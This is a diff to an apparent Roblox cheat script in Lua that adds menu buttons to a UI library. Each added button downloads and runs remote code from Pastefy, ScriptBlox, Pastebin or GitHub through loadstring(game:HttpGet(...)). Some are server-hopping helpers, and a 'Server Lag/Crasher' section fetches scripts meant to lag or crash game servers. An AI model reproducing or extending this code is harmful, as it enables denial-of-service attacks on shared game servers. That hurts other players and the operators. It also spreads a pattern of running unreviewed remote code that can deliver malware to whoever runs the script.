@@ -2528,6 +2528,46 @@ Section:NewKeybind("Keybind", "Keybind F To Open/Close", Enum.KeyCode.F, functio
 	Library:ToggleUI(F)
 end)
 
+local Section = Tab:NewSection("Private Server")
+ 
+Section:NewButton("Rejoin", "Rejoin Server", function()
+loadstring(game:HttpGet("https://pastefy.app/PMTCH507/raw"))()
+end)
+ 
+Section:NewButton("Join Smallest", "Join Smallest Server", function()
+loadstring(game:HttpGet("https://pastefy.app/VTSqjyIL/raw"))()
+end)
+ 
+Section:NewButton("Join Lowest Ping 1", "Added Ping 1", function()
+loadstring(game:HttpGet("https://pastefy.app/0EknkJVH/raw"))()
+end)
+ 
+Section:NewButton("Join Lowest Ping 2", "Added Ping 2", function()
+loadstring(game:HttpGet("https://pastefy.app/o6xgMdzl/raw"))()
+end)
+ 
+Section:NewButton("Server Hop", "Server Hop Server", function()
+loadstring(game:HttpGet("https://pastefy.app/hdxXQiOy/raw"))()
+end)
+ 
+Section:NewButton("Server Browser", "I Don't Know", function()
+loadstring(game:HttpGet("https://www.scriptblox.com/raw/Server-Browser_80", true))();
+end)
+ 
+local Section = Tab:NewSection("Server Lag/Crasher")
+ 
+Section:NewButton("Server Lag/Crasher 1", "Server Lag/Crasher 1", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/yGqP4zFa"))()
+end)
+ 
+Section:NewButton("Server Lag/Crash 2", "Server Lag/Crasher 2", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/yGqP4zFa"))()
+end)
+ 
+Section:NewButton("Server Lag/Crasher 3", "Server Lag/Crash 3", function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/d44df016fe28bc8d5974/things/main/robloxianwaterpark'))()
+end)
+
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "ScreenGui"
 ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
